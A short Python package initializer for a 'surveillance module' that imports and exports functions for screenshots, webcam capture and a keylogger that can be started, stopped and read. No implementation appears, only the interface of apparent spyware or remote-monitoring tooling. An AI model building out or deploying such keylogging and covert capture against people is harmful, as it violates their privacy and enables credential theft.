"""Surveillance module for screenshots, webcam, and keylogging"""

from .screenshot import take_screenshot
from .webcam import capture_webcam
from .keylogger import start_keylogger, stop_keylogger, is_keylogger_running, get_current_keylogger_text

__all__ = [
    'take_screenshot',
    'capture_webcam',
    'start_keylogger',
    'stop_keylogger',
    'is_keylogger_running',
    'get_current_keylogger_text'
] 